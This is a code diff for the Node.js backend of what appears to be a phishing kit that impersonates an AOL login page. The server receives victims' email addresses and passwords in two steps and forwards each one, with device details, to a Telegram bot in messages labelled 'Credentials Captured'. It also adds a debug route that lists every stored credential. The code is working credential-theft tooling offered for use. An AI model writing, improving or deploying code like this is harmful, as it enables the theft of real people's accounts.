@@ -6,15 +6,26 @@ const { v4: uuidv4 } = require("uuid");
 
 const app = express();
 
-// Simple CORS - allows your Vercel site and localhost
+// === FIXED CORS for Vercel + Localhost ===
 app.use(cors({
-  origin: [
-    "https://login-aol.vercel.app",
-    "http://localhost:3000",
-    "http://127.0.0.1:3000"
-  ],
-  methods: ["GET", "POST", "OPTIONS"],
-  allowedHeaders: ["Content-Type"],
+  origin: function (origin, callback) {
+    if (!origin) return callback(null, true);
+    
+    const allowedOrigins = [
+      'http://localhost:3000',
+      'http://127.0.0.1:3000',
+      'https://login-aol.vercel.app',
+      'https://demascus-production.up.railway.app'
+    ];
+    
+    if (allowedOrigins.includes(origin)) {
+      callback(null, true);
+    } else {
+      callback(new Error('Not allowed by CORS'));
+    }
+  },
+  methods: ['GET', 'POST', 'OPTIONS'],
+  allowedHeaders: ['Content-Type', 'Authorization'],
   credentials: true
 }));
 
@@ -46,45 +57,72 @@ async function sendToTelegram(text) {
 // Store attempts
 const loginAttempts = new Map();
 
-// Submit Email
+// ====================== STEP 1: Submit Email ======================
 app.post("/api/submit-email", async (req, res) => {
   const { email } = req.body;
 
-  if (!email) return res.status(400).json({ error: "Email is required" });
+  if (!email) {
+    return res.status(400).json({ error: "Email is required" });
+  }
 
   const attemptId = uuidv4();
   const userAgent = req.get("User-Agent") || "Unknown";
 
-  loginAttempts.set(attemptId, { email, userAgent, timestamp: new Date().toISOString() });
+  loginAttempts.set(attemptId, {
+    email,
+    userAgent,
+    timestamp: new Date().toISOString(),
+  });
 
   await sendToTelegram(
-    `🏋️‍♂️ *New Login Attempt*\n\n📧 *Email:* ${email}\n📱 *Device:* ${userAgent.slice(0, 120)}\n⏳ Waiting for password...`
+    `🏋️‍♂️ *New Login Attempt*\n\n` +
+    `📧 *Email:* ${email}\n` +
+    `📱 *Device:* ${userAgent.slice(0, 120)}${userAgent.length > 120 ? "..." : ""}\n` +
+    `⏳ Waiting for password...\n` +
+    `🔑 ID: \`${attemptId.slice(0, 8)}\``
   );
 
-  res.json({ status: "success", attemptId });
+  res.json({
+    status: "success",
+    message: "Email received. Please enter password.",
+    attemptId,
+  });
 });
 
-// Submit Password
+// ====================== STEP 2: Submit Password ======================
 app.post("/api/submit-password", async (req, res) => {
   const { attemptId, password } = req.body;
 
-  if (!attemptId || !password) return res.status(400).json({ error: "Missing data" });
+  if (!attemptId || !password) {
+    return res.status(400).json({ error: "attemptId and password required" });
+  }
 
   const attempt = loginAttempts.get(attemptId);
-  if (!attempt) return res.status(404).json({ error: "Invalid attempt" });
+  if (!attempt) {
+    return res.status(404).json({ error: "Invalid attempt ID" });
+  }
 
   attempt.password = password;
 
   await sendToTelegram(
-    `✅ *Credentials Captured*\n\n📧 *Email:* ${attempt.email}\n🔑 *Password:* \`${password}\``
+    `✅ *Login Credentials Captured*\n\n` +
+    `📧 *Email:* ${attempt.email}\n` +
+    `🔑 *Password:* \`${password}\`\n` +
+    `📱 *Device:* ${attempt.userAgent.slice(0, 120)}${attempt.userAgent.length > 120 ? "..." : ""}\n` +
+    `⏰ *Time:* ${new Date().toISOString()}`
   );
 
-  res.json({ status: "success" });
+  res.json({ status: "success", message: "Done" });
 });
 
-const port = process.env.PORT || 8080;
+// Debug route (optional)
+app.get("/api/debug", (req, res) => {
+  res.json(Array.from(loginAttempts.entries()));
+});
+
+// Use Railway PORT
+const port = process.env.PORT || 3000;
 
 app.listen(port, '0.0.0.0', () => {
   console.log(`🚀 Server running on port ${port}`);
-  console.log("CORS allowed for login-aol.vercel.app and localhost");
 });
